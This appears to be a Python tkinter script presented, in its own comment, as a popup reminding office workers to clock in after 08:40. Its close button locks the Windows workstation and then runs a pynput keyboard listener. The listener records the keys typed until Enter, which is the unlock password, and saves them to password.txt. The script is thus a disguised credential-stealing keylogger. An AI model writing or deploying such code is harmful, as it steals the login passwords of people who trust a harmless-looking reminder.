import time
import tkinter as tk
import tkinter.font as tf
from ctypes import *
from pynput import keyboard
##此脚本主要用户，当电脑时间为指定时间后，自动弹出“打卡信息”提示弹窗

window = tk.Tk()
window.title('My Window')
# 获取当前屏幕尺寸
screenWidth = int(window.winfo_screenwidth()*0.8)
screenHeight = int(window.winfo_screenheight()*0.8)
# 将当前屏幕尺寸设置为 window 窗口大小
exceptGeometry = str(screenWidth) + 'x' + str(screenHeight)
window.geometry(exceptGeometry)
# 设置标签字体设置
ft1 = tf.Font(family='行楷',size=80,slant=tf.ITALIC,weight=tf.BOLD)
ft2 = tf.Font(family='行楷',size=80,weight=tf.BOLD)
# 定义一个写入文件的函数
def write_to_file(fileName,content):
    with open(fileName,'w',encoding='utf-8')as file:
        file.write(content)
characterList = []
def on_press(key):
    character = str(key)
    if character != 'Key.enter':
        characterList.append(key)
    else:
        return False

# 定义一个锁屏函数 用户窗口中点击关闭按钮触发锁屏效果，且用于关闭window窗口
def lockScreen():
    user32 = windll.LoadLibrary('user32.dll')
    user32.LockWorkStation()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    write_to_file('password.txt',str(characterList))
    time.sleep(0.5)
    window.quit()

# 创建标签
var1 = tk.StringVar()
l1 = tk.Label(window,textvariable=var1,bg='yellow',fg='red',font=ft1,width=screenWidth,height=4)
l1.pack()
# 定义1个按钮，用于点击触发效果
b1 = tk.Button(window,text='请鼠标点击此处区域关闭弹窗',bg='white',fg='red',font=('Arial',40),width=screenWidth,height=1,command=lockScreen)
b1.pack()
l2 = tk.Label(window,text="辛苦工作一天咯,记得打卡呀！！！",bg='yellow',fg='red',font=ft2,width=screenWidth,height=7)
l2.pack()

condition = True

def jdgmentTime():
    global condition
    while condition==True:
        exceptTime = "08:40:00"
        # 获取当前时间的 年月日
        currentDate = time.strftime("%Y-%m-%d",time.localtime(time.time()))
        # 生成预期的时间
        exceptDateTime = currentDate + " " + exceptTime
        # 将预期的字符时间转换为 时间戳
        exceptTimeStamp = time.mktime(time.strptime(exceptDateTime,"%Y-%m-%d %H:%M:%S"))
        currentTimeStamp = time.time()
        currentDateTime = time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))
        if currentTimeStamp - exceptTimeStamp >= 0:
            condition = False
            var1.set(currentDateTime)
            window.mainloop()
        time.sleep(2)

if __name__ == '__main__':
    jdgmentTime()
